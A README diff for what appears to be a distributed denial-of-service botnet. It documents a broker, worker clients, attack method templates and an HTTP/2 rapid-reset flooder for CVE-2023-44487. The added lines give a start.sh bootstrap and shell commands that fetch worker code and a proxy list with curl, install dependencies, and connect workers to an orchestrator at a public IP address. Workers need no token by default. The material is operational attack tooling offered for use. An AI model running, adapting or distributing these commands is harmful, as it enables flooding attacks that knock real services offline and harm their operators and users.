@@ -31,6 +31,7 @@ client.js  ──HTTP upgrade──▶  index.js  ──job──▶  client.js 
 | --- | --- |
 | `index.js` | broker, HTTP API, docs page at `/` |
 | `method.json` | method list with command templates `<<host>>` `<<time>>` `<<method>>` |
+| `start.sh` | client bootstrap: fetch worker files, install `hpack`, start `client.js` |
 | `bot/client.js` | worker, connects to `index.js` and runs the job command |
 | `bot/rapidreset.js` | HTTP/2 flooder, CVE-2023-44487 |
 | `bot/proxi.txt` | proxy list, one entry per line |
@@ -75,6 +76,20 @@ mkdir -p bot && cd bot \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
   && npm i hpack --no-audit --no-fund \
   && ORCHESTRATOR=http://204.10.194.164:3295 node client.js
+```
+
+Or use the script, which does the same with dependency checks:
+
+```bash
+curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/start.sh
+chmod +x start.sh
+./start.sh
+```
+
+`start.sh` takes an optional target directory as its first argument (default `bot`) and reads the same environment variables. When the variable is unset, `CLIENT_TOKEN` defaults to empty, which matches a server without a token.
+
+```bash
+ORCHESTRATOR=http://10.0.0.5:3295 MAX_CONCURRENT=2 WORKER_NAME=node-01 ./start.sh worker-a
 ```
 
 With a token:
